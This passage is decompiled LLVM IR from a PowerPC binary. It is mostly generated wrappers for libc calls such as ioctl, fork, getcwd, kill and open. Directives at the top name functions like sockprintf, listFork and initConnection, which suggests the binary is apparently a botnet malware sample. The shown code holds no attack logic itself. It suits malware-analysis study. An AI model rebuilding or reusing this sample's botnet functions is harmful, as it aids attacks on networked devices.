  uselistorder i32 (i32, i32, i32)* @szprintf, { 208, 207, 206, 205, 204, 203, 202, 201, 200, 199, 198, 197, 196, 195, 194, 193, 192, 191, 190, 189, 188, 187, 186, 185, 184, 183, 182, 181, 180, 179, 178, 177, 176, 175, 174, 173, 172, 171, 170, 169, 168, 167, 166, 165, 164, 163, 162, 161, 160, 159, 158, 157, 156, 155, 154, 153, 152, 151, 150, 149, 148, 147, 146, 145, 144, 143, 142, 141, 140, 139, 138, 137, 136, 135, 134, 133, 132, 131, 130, 129, 128, 127, 126, 125, 124, 123, 122, 121, 120, 119, 118, 117, 116, 115, 114, 113, 112, 111, 110, 109, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0, 108, 107, 106, 105, 104, 103, 102, 101, 100, 99, 98, 97, 96, 95, 94, 93, 92, 91, 90, 89, 88, 87, 86, 85, 84, 83, 82, 81, 80, 79, 78, 77, 76, 75, 74, 73, 72, 71, 70, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25 }
  uselistorder i32 ()* @listFork, { 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i8*, i32)* @strstr, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i32)* @trim, { 1, 0 }
  uselistorder i32* @global_var_100287d8.46, { 2, 3, 0, 4, 5, 6, 7, 1, 8 }
  uselistorder i32 (i32, i32, i32)* @sockprintf, { 21, 2, 1, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 0 }
  uselistorder i32 (i32*, i32)* @__GI_inet_ntoa, { 3, 0, 1, 2, 4 }
  uselistorder i32 (i32)* @sleep, { 3, 0, 2, 1 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32, i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 2, 1, 5, 4, 3, 0 }
  uselistorder i8 47, { 1, 0 }
  uselistorder [2 x i8]* @global_var_10016b18.574, { 1, 0 }
  uselistorder i32 ptrtoint ([2 x i8]* @global_var_10016b18.574 to i32), { 1, 0 }
  uselistorder i32 (i32)* @srand, { 0, 2, 1 }
  uselistorder i32 (i32)* @__GI_time, { 3, 21, 20, 0, 19, 18, 1, 17, 16, 2, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_10016b00.569 to i32), { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1000c490.outer, { 0, 3, 2, 4, 1, 5 }
  uselistorder label %dec_label_pc_1000c454, { 1, 0 }
  uselistorder label %dec_label_pc_1000c400, { 1, 0 }
  uselistorder label %dec_label_pc_1000c33c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c30c, { 1, 0 }
  uselistorder label %dec_label_pc_1000c2dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000c1b8, { 1, 0 }
  uselistorder label %dec_label_pc_1000c194, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000c180, { 1, 0 }
  uselistorder label %dec_label_pc_1000c0f4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c050, { 1, 0 }
  uselistorder label %dec_label_pc_1000c018, { 1, 0 }
  uselistorder label %dec_label_pc_1000bf5c, { 1, 0 }
  uselistorder label %dec_label_pc_1000bee4, { 1, 0 }
  uselistorder label %dec_label_pc_1000be60, { 1, 0 }
  uselistorder label %dec_label_pc_1000be20, { 1, 0 }
  uselistorder label %dec_label_pc_1000bd28, { 1, 0 }
  uselistorder label %dec_label_pc_1000bce0, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc24, { 1, 0 }
  uselistorder label %dec_label_pc_1000bc14.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000bbf4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000bb58, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1000ba38, { 1, 0 }
  uselistorder label %dec_label_pc_1000b9d8, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg1, i32* @r3, align 4
  %stack_var_-32 = alloca i32, align 4
  %v4_1000c4d8 = icmp eq i32 %arg2, -2143521772
  %v2_1000c4ec = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c4ec, i32* %stack_var_-32, align 4
  br i1 %v4_1000c4d8, label %dec_label_pc_1000c54c, label %dec_label_pc_1000c50c

dec_label_pc_1000c50c:                            ; preds = %entry
  %v3_1000c50c = icmp ugt i32 %arg2, -2143521772
  br i1 %v3_1000c50c, label %dec_label_pc_1000c524, label %dec_label_pc_1000c514

dec_label_pc_1000c514:                            ; preds = %dec_label_pc_1000c50c
  %v3_1000c518 = icmp eq i32 %arg2, 1077703699
  br i1 %v3_1000c518, label %dec_label_pc_1000c540, label %dec_label_pc_1000c56c

dec_label_pc_1000c524:                            ; preds = %dec_label_pc_1000c50c
  %v1_1000c524 = xor i32 %arg2, -2143551488
  %v3_1000c528 = icmp eq i32 %v1_1000c524, 29717
  br i1 %v3_1000c528, label %dec_label_pc_1000c55c, label %dec_label_pc_1000c530

dec_label_pc_1000c530:                            ; preds = %dec_label_pc_1000c524
  %v3_1000c534 = icmp eq i32 %v1_1000c524, 29718
  br i1 %v3_1000c534, label %dec_label_pc_1000c564, label %dec_label_pc_1000c56c

dec_label_pc_1000c540:                            ; preds = %dec_label_pc_1000c514
  store i32 ptrtoint (i32* @global_var_1000c548.602 to i32), i32* @lr, align 4
  %v1_1000c544 = inttoptr i32 %arg3 to i32*
  %v2_1000c544 = call i32 @__GI_tcgetattr(i32* %v1_1000c544)
  br label %dec_label_pc_1000c554

dec_label_pc_1000c54c:                            ; preds = %entry
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_1000c550

dec_label_pc_1000c550:                            ; preds = %dec_label_pc_1000c564, %dec_label_pc_1000c55c, %dec_label_pc_1000c54c
  store i32 268485972, i32* @lr, align 4
  %v0_1000c550 = call i32 @__GI_tcsetattr()
  br label %dec_label_pc_1000c554

dec_label_pc_1000c554:                            ; preds = %dec_label_pc_1000c540, %dec_label_pc_1000c550
  %storemerge = phi i32 [ %v0_1000c550, %dec_label_pc_1000c550 ], [ %v2_1000c544, %dec_label_pc_1000c540 ]
  store i32 %storemerge, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c598

dec_label_pc_1000c55c:                            ; preds = %dec_label_pc_1000c524
  store i32 1, i32* @r4, align 4
  br label %dec_label_pc_1000c550

dec_label_pc_1000c564:                            ; preds = %dec_label_pc_1000c530
  store i32 2, i32* @r4, align 4
  br label %dec_label_pc_1000c550

dec_label_pc_1000c56c:                            ; preds = %dec_label_pc_1000c530, %dec_label_pc_1000c514
  %v0_1000c57c = call i32 @__asm_mfcr()
  %v1_1000c580 = and i32 %v0_1000c57c, 268435456
  %v3_1000c580 = icmp eq i32 %v1_1000c580, 0
  store i32 %v0_1000c57c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c580, label %dec_label_pc_1000c598, label %dec_label_pc_1000c58c

dec_label_pc_1000c58c:                            ; preds = %dec_label_pc_1000c56c
  %v0_1000c58c = call i32 @__errno_location()
  %v0_1000c590 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c590 = inttoptr i32 %v0_1000c58c to i32*
  store i32 %v0_1000c590, i32* %v2_1000c590, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c598

dec_label_pc_1000c598:                            ; preds = %dec_label_pc_1000c56c, %dec_label_pc_1000c554, %dec_label_pc_1000c58c
  %v0_1000c59c = phi i32 [ %v0_1000c57c, %dec_label_pc_1000c56c ], [ %storemerge, %dec_label_pc_1000c554 ], [ -1, %dec_label_pc_1000c58c ]
  ret i32 %v0_1000c59c

; uselistorder directives
  uselistorder i32 %arg2, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_1000c598, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000c554, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_1000c5b8 = load i32, i32* @lr, align 4
  %v1_1000c5b8 = load i1, i1* @cr0_so, align 1
  %v2_1000c5b8 = xor i1 %v1_1000c5b8, true
  call void @__pseudo_cond_branch(i1 %v2_1000c5b8, i32 %v0_1000c5b8)
  %v0_1000c5bc = call i32 @__syscall_error()
  ret i32 %v0_1000c5bc
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000c5d4 = add i32 %arg2, -12
  %v2_1000c5d8 = icmp ugt i32 %v1_1000c5d4, 2
  %v2_1000c5e0 = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c5e0, i32* %stack_var_-32, align 4
  br i1 %v2_1000c5d8, label %dec_label_pc_1000c60c, label %dec_label_pc_1000c5fc

dec_label_pc_1000c5fc:                            ; preds = %entry
  store i32 268486148, i32* @lr, align 4
  %v2_1000c600 = call i32 @__GI_fcntl64(i32 3)
  store i32 %v2_1000c600, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c62c

dec_label_pc_1000c60c:                            ; preds = %entry
  %v0_1000c610 = call i32 @__asm_mfcr()
  %v1_1000c614 = and i32 %v0_1000c610, 268435456
  %v3_1000c614 = icmp eq i32 %v1_1000c614, 0
  store i32 %v0_1000c610, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c614, label %dec_label_pc_1000c62c, label %dec_label_pc_1000c620

dec_label_pc_1000c620:                            ; preds = %dec_label_pc_1000c60c
  %v0_1000c620 = call i32 @__errno_location()
  %v0_1000c624 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c624 = inttoptr i32 %v0_1000c620 to i32*
  store i32 %v0_1000c624, i32* %v2_1000c624, align 4
  store i32 -1, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c62c

dec_label_pc_1000c62c:                            ; preds = %dec_label_pc_1000c60c, %dec_label_pc_1000c5fc, %dec_label_pc_1000c620
  %v0_1000c630 = phi i32 [ %v0_1000c610, %dec_label_pc_1000c60c ], [ %v2_1000c600, %dec_label_pc_1000c5fc ], [ -1, %dec_label_pc_1000c620 ]
  ret i32 %v0_1000c630

; uselistorder directives
  uselistorder label %dec_label_pc_1000c62c, { 2, 0, 1 }
}

define i32 @__GI_fcntl64(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v2_1000c65c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000c65c, i32* %stack_var_-32, align 4
  %v0_1000c678 = call i32 @__asm_mfcr()
  %v1_1000c67c = and i32 %v0_1000c678, 268435456
  %v3_1000c67c = icmp eq i32 %v1_1000c67c, 0
  store i32 %v0_1000c678, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c67c, label %dec_label_pc_1000c694, label %dec_label_pc_1000c688

dec_label_pc_1000c688:                            ; preds = %entry
  %v0_1000c688 = call i32 @__errno_location()
  %v0_1000c68c = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c68c = inttoptr i32 %v0_1000c688 to i32*
  store i32 %v0_1000c68c, i32* %v2_1000c68c, align 4
  br label %dec_label_pc_1000c694

dec_label_pc_1000c694:                            ; preds = %entry, %dec_label_pc_1000c688
  %v0_1000c6a4 = phi i32 [ %v0_1000c678, %entry ], [ -1, %dec_label_pc_1000c688 ]
  ret i32 %v0_1000c6a4

; uselistorder directives
  uselistorder label %dec_label_pc_1000c694, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  br label %dec_label_pc_1000c6bc

dec_label_pc_1000c6bc:                            ; preds = %dec_label_pc_1000c6bc.backedge, %entry
  %v0_1000c6c8 = call i32 @__asm_mfcr()
  %v1_1000c6cc = and i32 %v0_1000c6c8, 268435456
  %v3_1000c6cc = icmp eq i32 %v1_1000c6cc, 0
  store i32 %v0_1000c6c8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c6cc, label %dec_label_pc_1000c6bc.backedge, label %dec_label_pc_1000c6d8

dec_label_pc_1000c6d8:                            ; preds = %dec_label_pc_1000c6bc
  %v0_1000c6d8 = call i32 @__errno_location()
  %v0_1000c6dc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c6dc = inttoptr i32 %v0_1000c6d8 to i32*
  store i32 %v0_1000c6dc, i32* %v2_1000c6dc, align 4
  br label %dec_label_pc_1000c6bc.backedge

dec_label_pc_1000c6bc.backedge:                   ; preds = %dec_label_pc_1000c6d8, %dec_label_pc_1000c6bc
  br label %dec_label_pc_1000c6bc
}

define i32 @chdir(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c6fc = call i32 @__asm_mfcr()
  %v1_1000c700 = and i32 %v0_1000c6fc, 268435456
  %v3_1000c700 = icmp eq i32 %v1_1000c700, 0
  store i32 %v0_1000c6fc, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c700, label %dec_label_pc_1000c718, label %dec_label_pc_1000c70c

dec_label_pc_1000c70c:                            ; preds = %entry
  %v0_1000c70c = call i32 @__errno_location()
  %v0_1000c710 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c710 = inttoptr i32 %v0_1000c70c to i32*
  store i32 %v0_1000c710, i32* %v2_1000c710, align 4
  br label %dec_label_pc_1000c718

dec_label_pc_1000c718:                            ; preds = %entry, %dec_label_pc_1000c70c
  %v0_1000c728 = phi i32 [ %v0_1000c6fc, %entry ], [ -1, %dec_label_pc_1000c70c ]
  ret i32 %v0_1000c728

; uselistorder directives
  uselistorder label %dec_label_pc_1000c718, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c744 = call i32 @__asm_mfcr()
  %v1_1000c748 = and i32 %v0_1000c744, 268435456
  %v3_1000c748 = icmp eq i32 %v1_1000c748, 0
  store i32 %v0_1000c744, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c748, label %dec_label_pc_1000c760, label %dec_label_pc_1000c754

dec_label_pc_1000c754:                            ; preds = %entry
  %v0_1000c754 = call i32 @__errno_location()
  %v0_1000c758 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c758 = inttoptr i32 %v0_1000c754 to i32*
  store i32 %v0_1000c758, i32* %v2_1000c758, align 4
  br label %dec_label_pc_1000c760

dec_label_pc_1000c760:                            ; preds = %entry, %dec_label_pc_1000c754
  %v0_1000c770 = phi i32 [ %v0_1000c744, %entry ], [ -1, %dec_label_pc_1000c754 ]
  ret i32 %v0_1000c770

; uselistorder directives
  uselistorder label %dec_label_pc_1000c760, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c78c = call i32 @__asm_mfcr()
  %v1_1000c790 = and i32 %v0_1000c78c, 268435456
  %v3_1000c790 = icmp eq i32 %v1_1000c790, 0
  store i32 %v0_1000c78c, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c790, label %dec_label_pc_1000c7a8, label %dec_label_pc_1000c79c

dec_label_pc_1000c79c:                            ; preds = %entry
  %v0_1000c79c = call i32 @__errno_location()
  %v0_1000c7a0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c7a0 = inttoptr i32 %v0_1000c79c to i32*
  store i32 %v0_1000c7a0, i32* %v2_1000c7a0, align 4
  br label %dec_label_pc_1000c7a8

dec_label_pc_1000c7a8:                            ; preds = %entry, %dec_label_pc_1000c79c
  %v0_1000c7b8 = phi i32 [ %v0_1000c78c, %entry ], [ -1, %dec_label_pc_1000c79c ]
  ret i32 %v0_1000c7b8

; uselistorder directives
  uselistorder label %dec_label_pc_1000c7a8, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c7d4 = call i32 @__asm_mfcr()
  %v1_1000c7d8 = and i32 %v0_1000c7d4, 268435456
  %v3_1000c7d8 = icmp eq i32 %v1_1000c7d8, 0
  store i32 %v0_1000c7d4, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c7d8, label %dec_label_pc_1000c7f0, label %dec_label_pc_1000c7e4

dec_label_pc_1000c7e4:                            ; preds = %entry
  %v0_1000c7e4 = call i32 @__errno_location()
  %v0_1000c7e8 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c7e8 = inttoptr i32 %v0_1000c7e4 to i32*
  store i32 %v0_1000c7e8, i32* %v2_1000c7e8, align 4
  br label %dec_label_pc_1000c7f0

dec_label_pc_1000c7f0:                            ; preds = %entry, %dec_label_pc_1000c7e4
  %v0_1000c800 = phi i32 [ %v0_1000c7d4, %entry ], [ -1, %dec_label_pc_1000c7e4 ]
  ret i32 %v0_1000c800

; uselistorder directives
  uselistorder label %dec_label_pc_1000c7f0, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r28, align 4
  %v3_1000c810 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r30, align 4
  %v3_1000c820 = icmp eq i32 %arg1, 0
  br i1 %v3_1000c810, label %dec_label_pc_1000c820, label %dec_label_pc_1000c854

dec_label_pc_1000c820:                            ; preds = %entry
  br i1 %v3_1000c820, label %dec_label_pc_1000c83c, label %dec_label_pc_1000c828

dec_label_pc_1000c828:                            ; preds = %dec_label_pc_1000c820
  %v0_1000c828 = call i32 @__errno_location()
  store i32 0, i32* @r30, align 4
  %v2_1000c834 = inttoptr i32 %v0_1000c828 to i32*
  store i32 22, i32* %v2_1000c834, align 4
  br label %dec_label_pc_1000c8ec

dec_label_pc_1000c83c:                            ; preds = %dec_label_pc_1000c820
  store i32 268486720, i32* @lr, align 4
  %v0_1000c83c = call i32 @__GI_getpagesize()
  %v1_1000c840 = icmp slt i32 %v0_1000c83c, 4096
  %v0_1000c844. = select i1 %v1_1000c840, i32 4096, i32 %v0_1000c83c
  store i32 %v0_1000c844., i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000c864

dec_label_pc_1000c854:                            ; preds = %entry
  store i32 %arg2, i32* %r31.global-to-local, align 4
  store i32 %arg1, i32* @r29, align 4
  br i1 %v3_1000c820, label %dec_label_pc_1000c864, label %dec_label_pc_1000c874

dec_label_pc_1000c864:                            ; preds = %dec_label_pc_1000c83c, %dec_label_pc_1000c854
  %v0_1000c864 = phi i32 [ %v0_1000c844., %dec_label_pc_1000c83c ], [ %arg2, %dec_label_pc_1000c854 ]
  store i32 %v0_1000c864, i32* @r3, align 4
  store i32 268486764, i32* @lr, align 4
  %v0_1000c868 = call i32 @malloc()
  store i32 %v0_1000c868, i32* @r29, align 4
  %v3_1000c86c = icmp eq i32 %v0_1000c868, 0
  br i1 %v3_1000c86c, label %dec_label_pc_1000c8e8, label %dec_label_pc_1000c864.dec_label_pc_1000c874_crit_edge

dec_label_pc_1000c864.dec_label_pc_1000c874_crit_edge: ; preds = %dec_label_pc_1000c864
  br label %dec_label_pc_1000c874

dec_label_pc_1000c874:                            ; preds = %dec_label_pc_1000c864.dec_label_pc_1000c874_crit_edge, %dec_label_pc_1000c854
  %v0_1000c884 = call i32 @__asm_mfcr()
  %v1_1000c888 = and i32 %v0_1000c884, 268435456
  %v3_1000c888 = icmp eq i32 %v1_1000c888, 0
  store i32 %v0_1000c884, i32* %r31.global-to-local, align 4
  store i32 %v0_1000c884, i32* @r4, align 4
  br i1 %v3_1000c888, label %dec_label_pc_1000c8a4, label %dec_label_pc_1000c898

dec_label_pc_1000c898:                            ; preds = %dec_label_pc_1000c874
  %v0_1000c898 = call i32 @__errno_location()
  store i32 -1, i32* @r4, align 4
  %v0_1000c8a0 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c8a0 = inttoptr i32 %v0_1000c898 to i32*
  store i32 %v0_1000c8a0, i32* %v2_1000c8a0, align 4
  %v0_1000c8a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1000c8a4

dec_label_pc_1000c8a4:                            ; preds = %dec_label_pc_1000c874, %dec_label_pc_1000c898
  %v0_1000c8a4 = phi i32 [ %v0_1000c884, %dec_label_pc_1000c874 ], [ %v0_1000c8a4.pre, %dec_label_pc_1000c898 ]
  %v1_1000c8a4 = icmp slt i32 %v0_1000c8a4, 0
  %v0_1000c8a8 = load i32, i32* @r30, align 4
  %v3_1000c8a8 = icmp eq i32 %v0_1000c8a8, 0
  br i1 %v1_1000c8a4, label %dec_label_pc_1000c8d8, label %dec_label_pc_1000c8b0

dec_label_pc_1000c8b0:                            ; preds = %dec_label_pc_1000c8a4
  br i1 %v3_1000c8a8, label %dec_label_pc_1000c8b4, label %dec_label_pc_1000c8c8.thread8

dec_label_pc_1000c8c8.thread8:                    ; preds = %dec_label_pc_1000c8b0
  br label %dec_label_pc_1000c8ec

dec_label_pc_1000c8b4:                            ; preds = %dec_label_pc_1000c8b0
  %v0_1000c8b4 = load i32, i32* @r28, align 4
  %v3_1000c8b4 = icmp eq i32 %v0_1000c8b4, 0
  br i1 %v3_1000c8b4, label %dec_label_pc_1000c8c8, label %dec_label_pc_1000c8c8.thread

dec_label_pc_1000c8c8.thread:                     ; preds = %dec_label_pc_1000c8b4
  br label %dec_label_pc_1000c8d0

dec_label_pc_1000c8c8:                            ; preds = %dec_label_pc_1000c8b4
  %v0_1000c8bc = load i32, i32* @r29, align 4
  store i32 268486852, i32* @lr, align 4
  %v1_1000c8c0 = call i32 @realloc(i32 %v0_1000c8bc)
  store i32 %v1_1000c8c0, i32* @r30, align 4
  %v3_1000c8c8 = icmp eq i32 %v1_1000c8c0, 0
  br i1 %v3_1000c8c8, label %dec_label_pc_1000c8d0, label %dec_label_pc_1000c8ec

dec_label_pc_1000c8d0:                            ; preds = %dec_label_pc_1000c8c8.thread, %dec_label_pc_1000c8c8
  %v0_1000c8d0 = load i32, i32* @r29, align 4
  store i32 %v0_1000c8d0, i32* @r30, align 4
  br label %dec_label_pc_1000c8ec

dec_label_pc_1000c8d8:                            ; preds = %dec_label_pc_1000c8a4
  br i1 %v3_1000c8a8, label %dec_label_pc_1000c8dc, label %dec_label_pc_1000c8e8

dec_label_pc_1000c8dc:                            ; preds = %dec_label_pc_1000c8d8
  %v0_1000c8dc = load i32, i32* @r29, align 4
  store i32 %v0_1000c8dc, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000c8e4.603 to i32), i32* @lr, align 4
  %v0_1000c8e0 = call i32 @free()
  br label %dec_label_pc_1000c8ec

dec_label_pc_1000c8e8:                            ; preds = %dec_label_pc_1000c8d8, %dec_label_pc_1000c864
  store i32 0, i32* @r30, align 4
  br label %dec_label_pc_1000c8ec

dec_label_pc_1000c8ec:                            ; preds = %dec_label_pc_1000c8c8.thread8, %dec_label_pc_1000c8c8, %dec_label_pc_1000c8dc, %dec_label_pc_1000c8d0, %dec_label_pc_1000c828, %dec_label_pc_1000c8e8
  %v0_1000c8f0 = load i32, i32* @r30, align 4
  ret i32 %v0_1000c8f0

; uselistorder directives
  uselistorder i32 %v0_1000c884, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1000c8ec, { 5, 2, 3, 1, 0, 4 }
  uselistorder label %dec_label_pc_1000c8d0, { 1, 0 }
  uselistorder label %dec_label_pc_1000c8a4, { 1, 0 }
  uselistorder label %dec_label_pc_1000c864, { 1, 0 }
}

define i32 @getdtablesize(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_1000c910 = ptrtoint i32* %stack_var_-24 to i32
  store i32 268486940, i32* @lr, align 4
  %v2_1000c918 = call i32 @getrlimit(i32 7, i32 %v2_1000c910)
  %v1_1000c91c = icmp slt i32 %v2_1000c918, 0
  br i1 %v1_1000c91c, label %dec_label_pc_1000c92c, label %dec_label_pc_1000c928

dec_label_pc_1000c928:                            ; preds = %entry
  %v3_1000c928 = load i32, i32* %stack_var_-24, align 4
  br label %dec_label_pc_1000c92c

dec_label_pc_1000c92c:                            ; preds = %entry, %dec_label_pc_1000c928
  %v0_1000c938 = phi i32 [ 256, %entry ], [ %v3_1000c928, %dec_label_pc_1000c928 ]
  ret i32 %v0_1000c938

; uselistorder directives
  uselistorder label %dec_label_pc_1000c92c, { 1, 0 }
}

define i32 @__GI_getpagesize() local_unnamed_addr {
entry:
  %v3_1000c944 = load i32, i32* @global_var_10028820.604, align 4
  %v3_1000c948 = icmp eq i32 %v3_1000c944, 0
  %v0_1000c94c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000c948, i32 %v0_1000c94c)
  ret i32 %v3_1000c944
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c970 = call i32 @__asm_mfcr()
  %v1_1000c974 = and i32 %v0_1000c970, 268435456
  %v3_1000c974 = icmp eq i32 %v1_1000c974, 0
  store i32 %v0_1000c970, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c974, label %dec_label_pc_1000c98c, label %dec_label_pc_1000c980

dec_label_pc_1000c980:                            ; preds = %entry
  %v0_1000c980 = call i32 @__errno_location()
  %v0_1000c984 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c984 = inttoptr i32 %v0_1000c980 to i32*
  store i32 %v0_1000c984, i32* %v2_1000c984, align 4
  br label %dec_label_pc_1000c98c

dec_label_pc_1000c98c:                            ; preds = %entry, %dec_label_pc_1000c980
  %v0_1000c99c = phi i32 [ %v0_1000c970, %entry ], [ -1, %dec_label_pc_1000c980 ]
  ret i32 %v0_1000c99c

; uselistorder directives
  uselistorder label %dec_label_pc_1000c98c, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000c9b8 = call i32 @__asm_mfcr()
  %v1_1000c9bc = and i32 %v0_1000c9b8, 268435456
  %v3_1000c9bc = icmp eq i32 %v1_1000c9bc, 0
  store i32 %v0_1000c9b8, i32* %r31.global-to-local, align 4
  br i1 %v3_1000c9bc, label %dec_label_pc_1000c9d4, label %dec_label_pc_1000c9c8

dec_label_pc_1000c9c8:                            ; preds = %entry
  %v0_1000c9c8 = call i32 @__errno_location()
  %v0_1000c9cc = load i32, i32* %r31.global-to-local, align 4
  %v2_1000c9cc = inttoptr i32 %v0_1000c9c8 to i32*
  store i32 %v0_1000c9cc, i32* %v2_1000c9cc, align 4
  br label %dec_label_pc_1000c9d4

dec_label_pc_1000c9d4:                            ; preds = %entry, %dec_label_pc_1000c9c8
  %v0_1000c9e4 = phi i32 [ %v0_1000c9b8, %entry ], [ -1, %dec_label_pc_1000c9c8 ]
  ret i32 %v0_1000c9e4

; uselistorder directives
  uselistorder label %dec_label_pc_1000c9d4, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_1000ca00 = call i32 @__asm_mfcr()
  %v1_1000ca04 = and i32 %v0_1000ca00, 268435456
  %v3_1000ca04 = icmp eq i32 %v1_1000ca04, 0
  store i32 %v0_1000ca00, i32* %r31.global-to-local, align 4
  br i1 %v3_1000ca04, label %dec_label_pc_1000ca1c, label %dec_label_pc_1000ca10

dec_label_pc_1000ca10:                            ; preds = %entry
  %v0_1000ca10 = call i32 @__errno_location()
  %v0_1000ca14 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000ca14 = inttoptr i32 %v0_1000ca10 to i32*
  store i32 %v0_1000ca14, i32* %v2_1000ca14, align 4
  br label %dec_label_pc_1000ca1c

dec_label_pc_1000ca1c:                            ; preds = %entry, %dec_label_pc_1000ca10
  %v0_1000ca2c = phi i32 [ %v0_1000ca00, %entry ], [ -1, %dec_label_pc_1000ca10 ]
  ret i32 %v0_1000ca2c

; uselistorder directives
  uselistorder label %dec_label_pc_1000ca1c, { 1, 0 }
}

define i32 @__libc_open(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v1_1000ca44 = and i32 %arg2, 64
  %v3_1000ca44 = icmp eq i32 %v1_1000ca44, 0
  br i1 %v3_1000ca44, label %dec_label_pc_1000ca70, label %dec_label_pc_1000ca54

dec_label_pc_1000ca54:                            ; preds = %entry
  %v2_1000ca5c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_1000ca5c, i32* %stack_var_-32, align 4
  %v0_1000ca6c = load i32, i32* @r5, align 4
  br label %dec_label_pc_1000ca70

dec_label_pc_1000ca70:                            ; preds = %entry, %dec_label_pc_1000ca54
  %v0_1000ca70 = phi i32 [ 0, %entry ], [ %v0_1000ca6c, %dec_label_pc_1000ca54 ]
  store i32 %v0_1000ca70, i32* @r5, align 4
  %v0_1000ca78 = call i32 @__asm_mfcr()
